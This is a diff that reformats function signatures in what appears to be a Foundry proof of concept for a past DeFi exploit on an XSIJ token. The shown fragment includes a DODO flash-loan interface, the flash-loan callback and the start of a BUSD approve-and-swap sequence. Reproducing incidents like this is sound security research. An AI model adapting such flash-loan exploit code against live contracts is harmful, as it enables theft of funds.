@@ -11,7 +11,12 @@ import "./../interface.sol";
 // GUY : https://x.com/CertiKAlert/status/1752384801535918264
 
 interface IDodo {
-    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
+    function flashLoan(
+        uint256 baseAmount,
+        uint256 quoteAmount,
+        address assetTo,
+        bytes calldata data
+    ) external;
 }
 
 interface XSIJ is IERC20 {
@@ -41,7 +46,12 @@ contract Exploit is Test {
         );
     }
 
-    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
+    function DPPFlashLoanCall(
+        address sender,
+        uint256 baseAmount,
+        uint256 quoteAmount,
+        bytes calldata data
+    ) external {
         BUSD.approve(address(Router), 100_000 * 1e18);
         address[] memory path = new address[](2);
         path[0] = address(BUSD);
